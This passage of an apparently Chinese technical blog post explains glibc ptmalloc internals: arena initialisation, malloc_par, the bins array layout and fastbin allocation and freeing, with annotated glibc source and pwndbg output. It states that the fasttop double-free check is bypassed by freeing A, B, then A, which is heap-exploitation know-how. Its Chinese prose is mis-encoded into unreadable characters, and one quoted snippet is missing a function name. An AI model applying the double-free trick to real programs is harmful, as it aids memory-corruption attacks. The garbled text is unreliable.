class="line">    <span class="comment">/* Establish circular links for normal bins */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) <span class="comment">// NBINS = 128</span></span><br><span class="line">    &#123;</span><br><span class="line">        bin = bin_at(av, i);</span><br><span class="line">        bin-&gt;fd = bin-&gt;bk = bin; <span class="comment">// æœ€åˆæ—¶,å„ä¸ªbinsé“¾è¡¨å¤´éƒ½æŒ‡å‘è‡ªèº«</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)		</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        set_noncontiguous(av);		<span class="comment">//çœ‹ä¸æ‡‚</span></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena)		<span class="comment">//ä¸»åˆ†é…åŒºçš„fastbinsæœ€å¤§å­˜æ”¾0x80çš„å †å—(åŒ…å«å…ƒæ•°æ®)</span></span><br><span class="line">        set_max_fast(DEFAULT_MXFAST); <span class="comment">// 0x80</span></span><br><span class="line">    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    av-&gt;top = initial_top(av);			<span class="comment">//åˆå§‹åŒ–åˆ†é…åŒºå¤´å—,æŒ‡å‘unsortedbinæ¡¶å­å¤´</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¯¹<code>topchunk</code>çš„åˆå§‹åŒ–æ•ˆæœæ˜¯,<code>topchunk</code>æŒ‡å‘<code>unsortedbin</code>æ¡¶å­å¤´</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top = 0x7ffff7fa6ce0 &lt;main_arena+96&gt;,</span><br><span class="line">bins = &#123;0x7ffff7fa6ce0 &lt;main_arena+96&gt;, 0x7ffff7fa6ce0 &lt;main_arena+96&gt;,...</span><br></pre></td></tr></table></figure>
<h3 id="malloc_par">malloc_par</h3>
<p>åˆ†é…åŒºé…ç½®æ–‡ä»¶,åªæœ‰ä¸€ä¸ªå®ä¾‹<code>mp_</code>,ä½äº<code>glibc</code>å†…éƒ¨,åœ¨<code>glibc</code>åŠ è½½æ—¶å³å®Œæˆåˆå§‹åŒ–</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">        .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">        .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">        .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8))</span></span><br><span class="line">        .arena_test = NARENAS_FROM_NCORES(<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">            ,</span><br><span class="line">        .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">        .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">        .tcache_max_bytes = tidx2usize(TCACHE_MAX_BINS - <span class="number">1</span>),</span><br><span class="line">        .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x mp_</span><br><span class="line"><span class="variable">$15</span> = &#123;</span><br><span class="line">  trim_threshold = 0x20000,</span><br><span class="line">  top_pad = 0x20000,</span><br><span class="line">  mmap_threshold = 0x20000,</span><br><span class="line">  arena_test = 0x8,</span><br><span class="line">  arena_max = 0x0,</span><br><span class="line">  thp_pagesize = 0x0,</span><br><span class="line">  hp_pagesize = 0x0,</span><br><span class="line">  hp_flags = 0x0,</span><br><span class="line">  n_mmaps = 0x0,</span><br><span class="line">  n_mmaps_max = 0x10000,</span><br><span class="line">  max_n_mmaps = 0x0,</span><br><span class="line">  no_dyn_threshold = 0x0,</span><br><span class="line">  mmapped_mem = 0x0,</span><br><span class="line">  max_mmapped_mem = 0x0,</span><br><span class="line">  sbrk_base = 0x0,</span><br><span class="line">  tcache_bins = 0x40,				//tcacheæœ‰0x40ä¸ªæ¡¶å­</span><br><span class="line">  tcache_max_bytes = 0x408,			//tcacheä¸­æœ€å¤§èƒ½æ”¾çš„å †å—å¤§å°</span><br><span class="line">  tcache_count = 0x7,				//ä¸€ä¸ªtcacheæ¡¶å­ä¸­æœ€å¤šæ”¾7å—</span><br><span class="line">  tcache_unsorted_limit = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="æ–Œs">æ–Œs</h2>
<p><strong>unsortedbin,smallbins,largebins</strong>å®é™…ä¸Šä½äºåŒä¸€ä¸ªæ•°ç»„çš„ä¸åŒä¸‹æ ‡ä½ç½®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];				<span class="comment">//unsortedbin &amp; smallbins &amp; largebins</span></span><br><span class="line">								<span class="comment">//NBINS = 128</span></span><br><span class="line">								<span class="comment">//bins[254]</span></span><br></pre></td></tr></table></figure>
<p><code>bins</code>å…±æœ‰<code>254</code>ä¸ªå…ƒç´ ,ä½†æ˜¯å®é™…ä¸Šæ˜¯<code>127</code>ä¸ªæ¡¶å­å¤´,æ¯ä¸ªæ¡¶å­å¤´å ç”¨ç›¸é‚»çš„ä¸¤ä¸ª<code>bins</code>å…ƒç´ </p>
<p>è¿™ä¸ªæ¡¶å­å¤´æŒºå¥‡è‘©çš„,åä¹‰ä¸Šæ¡¶å­å¤´æ˜¯ä¸€ä¸ª<code>malloc_chunk</code>,ç„¶è€Œå®é™…ä¸Šä¸€ä¸ªæ¡¶å­å¤´åªæœ‰<code>fd</code>å’Œ<code>bk</code>ä¸¤ä¸ªæŒ‡é’ˆæœ‰æ•ˆ,å…¶ä»–éƒ¨åˆ†å’Œå‰ä¸€ä¸ªæ¡¶å­å¤´é‡å </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026183930533.png"
alt="bin_at" />
<figcaption aria-hidden="true">bin_at</figcaption>
</figure>
<p>å¯ä»¥çœ‹åˆ°<code>bins[0]</code>æ—¢å¤„äº<code>bin_at(M,1)-&gt;fd</code>çš„ä½ç½®,åˆå¤„äº<code>bin_at(M,2)-&gt;prev_size</code>çš„ä½ç½®</p>
<p>è€Œå®é™…ä¸Šæ¡¶å­å¤´å¹¶ä¸éœ€è¦<code>prev_size</code>å’Œ<code>size</code>è¿™ä¸¤ä¸ªå±æ€§,åªéœ€è¦å‰é©±åç»§æŒ‡é’ˆå°±å¯ä»¥äº†</p>
<p><strong>å› æ­¤<code>bins[0]</code>æ‰®æ¼”<code>bin_at(M,1)-&gt;fd</code>çš„è§’è‰²</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bin_at(M,0)								//æ— æ•ˆ</span><br><span class="line">bin_at(M,1) =&gt; unsorted bin				//1ä¸ª</span><br><span class="line">bin_at(M,2~63) =&gt; small bins			//</span><br><span class="line">bin_at(M,64~126) =&gt; large bins</span><br></pre></td></tr></table></figure>
<p><strong>fastbins</strong>æ¯”è¾ƒç‰¹æ®Š,æ˜¯ä¸Šè¿°ä¸‰ç§<code>bins</code>çš„ç¼“å­˜å™¨,è‡ªå·±ä½¿ç”¨ä¸€ä¸ªæ•°ç»„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br></pre></td></tr></table></figure>
<h3 id="topchunk">Topchunk</h3>
<p><code>topchunk</code>æ˜¯æ‚è´§å¸‚åœº</p>
<p>æœ€åˆæ–Œå®¶ä¸€ç©·äºŒç™½, ç”¨æˆ·ä»<strong>å¤´å—æ‚è´§å¸‚åœº</strong>ç›´æ¥æ‹¿è´§,
ç”¨å®Œäº†é‡Šæ”¾çš„æ—¶å€™, æ–Œå®¶çš„ä¹±æ–Œæ¥æ‹¾ç ´çƒ‚å„¿, ç„¶åæ‹¿å›å®¶å’Œå¤§æ–Œå°æ–Œåˆ†èµƒ</p>
<p>æ­¤åç”¨æˆ·ä¼˜å…ˆä»æ–Œå®¶æ‹¿è´§,
æ–Œå®¶æ²¡è´§æ‰ä¼šå»<strong>å¤´å—æ‚è´§å¸‚åœº</strong>æ‹¿è´§</p>
<h4 id="algorithm">algorithm</h4>
<p>å¦‚æœå„ä¸ª<code>bin</code>éƒ½æ²¡èƒ½æ»¡è¶³åˆ†é…è¯·æ±‚,é‚£ä¹ˆåªèƒ½è¯·<code>topchunk</code>å‡ºå±±</p>
<p>è¿™æ˜¯<code>ptmalloc</code>å †ç®¡ç†å™¨èƒ½å¤Ÿæ‹¿å‡ºçš„æœ€å¤§å†…å­˜å—äº†</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241031150833167.png"
alt="image-20241031150833167" />
<figcaption aria-hidden="true">image-20241031150833167</figcaption>
</figure>
<h3 id="å¿«æ–Œfastbins">å¿«æ–ŒFastbins</h3>
<h4 id="datastructure">datastructure</h4>
<p><code>fastbins</code>å®é™…ä¸Šæ˜¯ä¸€ç»„å•é“¾è¡¨,
è¯¥å•é“¾è¡¨çš„æ‰€æœ‰é™„åŠ å¤´èŠ‚ç‚¹ä½äºåˆ—è¡¨<code>fastbins</code>åˆ—è¡¨ä¸­</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026103730227.png"
alt="image-20241026103730227" />
<figcaption aria-hidden="true">image-20241026103730227</figcaption>
</figure>
<p><code>fastbins</code>ä¸­å…±æœ‰<code>10</code>ä¸ªå•é“¾è¡¨</p>
<p>æ˜¾ç„¶æ¯ä¸ªå•é“¾è¡¨ä¸­å­˜æ”¾å¤§å°ç›¸åŒçš„å †å—,å…·ä½“æ¥è¯´,å †å—å¤§å°åˆ°ä¸‹æ ‡çš„æ˜ å°„ä¸º:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index(sz) </span><br><span class="line">	= ((((<span class="type">unsigned</span> <span class="type">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line">	= ( sz &gt;&gt; <span class="number">4</span> ) - <span class="number">2</span> </span><br><span class="line">        </span><br><span class="line"> </span><br><span class="line">#MAX_FAST_SIZE     </span><br><span class="line">	= (<span class="number">80</span> * SIZE_SZ / <span class="number">4</span>)</span><br><span class="line">    = <span class="number">160</span></span><br><span class="line"></span><br><span class="line">NFASTBINS  </span><br><span class="line">    = (fastbin_index (request2size (MAX_FAST_SIZE)) + <span class="number">1</span>)</span><br><span class="line">    = fastbin_index(<span class="number">0xb0</span>) + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xb0</span> / <span class="number">0x10</span> - <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xb</span> - <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xa</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>fastbins idx</th>
<th>mem_size</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0x10</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x20</td>
<td>0x30</td>
</tr>
<tr>
<td>2</td>
<td>0x30</td>
<td>0x40</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td></td>
<td>0x80</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>9</td>
<td>0xa0</td>
<td>0xb0</td>
</tr>
</tbody>
</table>
<blockquote>
<p>ç„¶è€Œå®é™…ä¸Šåªèƒ½ç”¨åˆ°å‰<code>7</code>ä¸ª,ä¹Ÿå°±æ˜¯<code>[0:6]</code>è¿™<code>7</code>ä¸ªæ¡¶,è¿™æ˜¯åˆ†é…åŒºåˆå§‹åŒ–æ—¶ä¼šé™åˆ¶æœ€å¤§<code>fastbins</code>å †å—å¤§å°ä¸º<code>0x80</code>(åŒ…å«å…ƒæ•°æ®)</p>
<p>ç„¶ååœ¨<code>_int_free</code>å‡½æ•°ä¸­ä¼šæ£€æŸ¥å½“å‰å †å—å¤§å°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())&#123;</span><br><span class="line">    <span class="comment">//å°è¯•ä½¿ç”¨fastbin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœå½“å‰å †å—å¤§å°å¤§äº<code>0x80</code>åˆ™ä¸ä¼šé€šè¿‡è¯¥æ£€æŸ¥,ä¹Ÿå°±ä¸ä¼šå¾€<code>fastbins</code>ä¸­å¡</p>
<p>å¦‚æœè°ƒç”¨<code>set_max_fast(s)</code>é‡æ–°è®¾ç½®<code>global_max_fast</code>å€¼,ä½¿å…¶å¤§äº<code>MAX_FAST_SIZE</code>,ä¹Ÿæ˜¯ä¸å¯ä»¥çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s) \</span></span><br><span class="line"><span class="meta">  global_max_fast = (((size_t) (s) &lt;= MALLOC_ALIGN_MASK - SIZE_SZ)	\</span></span><br><span class="line"><span class="meta">                     ? MIN_CHUNK_SIZE / 2 : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="title function_">INTERNAL_SIZE_T</span></span><br><span class="line"> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">     _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">     (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">     global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">     this.)  */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥<code>__builtin_unreachable</code></p>
</blockquote>
<h4 id="algorithm-1">algorithm</h4>
<p>å¿«æ–Œå¯èƒ½å»è¿™å‡ ä¸ªåœ°æ–¹è¿›è´§:</p>
<p>1.<code>free</code>æ—¶<code>tcache</code>æœªå¯ç”¨æˆ–è€…å·²ç»å……æ»¡,å¹¶ä¸”å †å—ä¸æ˜¯<code>mmap</code>å †å—,å¹¶ä¸”å¤§å°åœ¨å¿«æ–Œç®¡ç†èŒƒå›´å†…,å¹¶ä¸”å¿«æ–Œç¼ºè´§,
é‚£ä¹ˆå¿«æ–Œä¼šç•™ä¸‹è¿™å—</p>
<h5 id="free">free</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241021102154730.png"
alt="free beyond tcache" />
<figcaption aria-hidden="true">free beyond tcache</figcaption>
</figure>
<p>å½“å¯¹åº”å †å—å¤§å°çš„<code>tcache</code>è¢«å¡«å……æ»¡ä¹‹å,å¦‚æœè¿˜æœ‰ç›¸åŒå¤§å°çš„å †å—é‡Šæ”¾,ä¼šå…ˆå°è¯•æ”¾åˆ°<code>fastbins</code>ä¸­</p>
<p>åœ¨<code>x64</code>ä¸Š,é»˜è®¤æƒ…å†µä¸‹,å°äº<code>0x80</code>(åŒ…å«å…ƒæ•°æ®)çš„å †å—,æ‰ä¼šè¢«å¡åˆ°<code>fastbins</code>ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_int_malloc.c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);								<span class="comment">//sizeæ¢ç®—æ¡¶ä¸‹æ ‡</span></span><br><span class="line">fb = &amp;fastbin(av, idx);												<span class="comment">//æ¡¶å­å¤´èŠ‚ç‚¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">mchunkptr old = *fb, old2;											<span class="comment">//*fbæ˜¯æ¡¶å­å¤´åŸæ¥æŒ‡å‘çš„ç¬¬ä¸€ä¸ªchunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)			<span class="comment">//å¦‚æœå½“å‰è¿›ç¨‹åªæœ‰ä¸€ä¸ªçº¿ç¨‹,é‚£ä¹ˆæ˜¾ç„¶åªä¼šä½¿ç”¨åˆ°main_arena,ä¸ä¼šæœ‰å…¶ä»–åˆ†é…åŒº</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">       add (i.e., double free).  */</span>									<span class="comment">//å”æ°ä¸€æ ·çš„DFåˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))								<span class="comment">//å½“å‰é‡Šæ”¾çš„pæ˜¯å¦å’Œä¸Šæ¬¡é‡Šæ”¾æ˜¯åŒä¸€å—</span></span><br><span class="line">        malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);								<span class="comment">//å¤´æ’æ³•ä¸Šé“¾,åç»§æŒ‡é’ˆä¹Ÿä½¿ç”¨SafeLinking</span></span><br><span class="line">    *fb = p;														<span class="comment">//æ¡¶å­å¤´åˆ°å †å—çš„æŒ‡é’ˆæ˜¯è£¸çš„</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">           add (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">        old2 = old;</span><br><span class="line">        p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);</span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªéå¸¸å”æ°çš„äºŒæ¬¡é‡Šæ”¾æ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))								</span><br><span class="line">    malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>æ„æ€å°±æ˜¯æœ¬æ¬¡é‡Šæ”¾çš„å †å—å’Œæ¡¶å­é‡Œæœ€åä¸€æ¬¡é‡Šæ”¾çš„å †å—ä¸èƒ½æ˜¯ä¸€ä¸ª</p>
<p>é‚£å…ˆ<code>free(A)</code>ç„¶å<code>free(B)</code>ç„¶å<code>free(A)</code>,å°±é¥¶è¿‡äº†</p>
</blockquote>
<p><strong>æ³¨æ„åˆ°è¿”è¿˜ç»™fastbinsçš„å †å—,ä¸ä¼šæ¶ˆé™¤ä¸‹ä¸€å †å—P(Prev in
use)æ ‡å¿—,è¿™å°±å¯¼è‡´å †å—åˆå¹¶æ—¶ä¸ä¼šç‰µæ‰¯åˆ°fastbinsä¸­çš„å †å—</strong></p>
<h5 id="malloc">malloc</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png"
alt="malloc beyond tcache" />
<figcaption aria-hidden="true">malloc beyond tcache</figcaption>
</figure>
<p>ä¸€æ¬¡<code>malloc</code>è¯·æ±‚,å¯èƒ½å‘ç”Ÿä¸¤ä»¶äº‹:</p>
<p>1.å¦‚æœ<code>fastbin</code>å¯¹åº”æ¡¶å­ä¸­æœ‰ç©ºé—²å †å—,æŠŠ<code>fastbin</code>ä¸­ç›¸åº”æ¡¶å­ä¸­çš„<strong>å¤´å—</strong>è¿”å›</p>
<p>2.å¦‚æœ<code>tcache</code>å¯¹åº”æ¡¶å­æœ‰ç©º,å†æŠŠ<code>fastbin</code>ä¸­å‰©ä¸‹çš„ç›¸åº”å¤§å°çš„å †å—å¡æ»¡<code>tcache</code>å¯¹åº”çš„æ¡¶å­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index(nb);                                            <span class="comment">//å¤§å°æ¢ç®—ä¸‹æ ‡</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);                                <span class="comment">//æ¡¶å­å¤´</span></span><br><span class="line">    mchunkptr pp;                                               </span><br><span class="line">    victim = *fb;                                                       <span class="comment">//æ¡¶é‡Œçš„ç¬¬ä¸€å—</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)                                                 <span class="comment">//å¦‚æœæ¡¶é‡Œä¸€å—éƒ½æ²¡æœ‰,å°±åˆ«åœ¨fastbinsä¸­åºŸè¯äº†,æ»šè›‹å°±å®Œäº†</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(victim)))                 <span class="comment">//å¯¹é½æ£€æŸ¥</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)                                            <span class="comment">//å¦‚æœæ˜¯å•çº¿ç¨‹åˆ™å°†å¤´å—æ‹†ä¸‹æ¥, æ¬¡å—æˆä¸ºå¤´å—</span></span><br><span class="line">            *fb = REVEAL_PTR(victim-&gt;fd);</span><br><span class="line">        <span class="keyword">else</span>                                                            <span class="comment">//å¦‚æœæ˜¯å¤šçº¿ç¨‹, åˆ™è°ƒç”¨REMOVE_FBå®å°†å¤´å—æ‹†ä¸‹æ¥</span></span><br><span class="line">            REMOVE_FB(fb, pp, victim);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely(victim != <span class="literal">NULL</span>))                             <span class="comment">//æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥å°±æ‹¿åˆ°äº†ä¸€å—</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">size_t</span> victim_idx = fastbin_index(chunksize(victim));       <span class="comment">//å†æ£€æŸ¥ä¸€ä¸‹æ‹¿åˆ°çš„è¿™å—å¤§å°æ˜¯å¦åˆæ ¼</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="number">0</span>))					<span class="comment">//æ£€æ ¡ä¸€ä¸‹è¿™ä¸ªå †å—æ˜¯ä¸æ˜¯æ’ç­ç”Ÿ</span></span><br><span class="line">                malloc_printerr(<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">            check_remalloced_chunk(av, victim, nb);</span><br><span class="line">           ...</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//////////////////////////////////////</span></span><br><span class="line">      <span class="comment">////////////å°è¯•ç¼“å­˜è‡³tcache////////////</span></span><br><span class="line">      <span class="comment">//////////////////////////////////////        </span></span><br><span class="line">               </span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);											<span class="comment">//å †å—åœ¨ç»™ç”¨æˆ·ä½¿ç”¨ä¹‹å‰,æŠŠå…¶ä¸­çš„æ•°æ®å…¨éƒ½æ“¦é™¤,é˜²æ­¢ä¿¡æ¯æ³„éœ²</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>
<p>å®é™…ä¸Šå¦‚æœç¼–è¯‘æ—¶å¼€å¯äº†<code>USE_TCACHE</code>é€‰é¡¹(é»˜è®¤æ˜¯å¼€å¯çš„),</p>
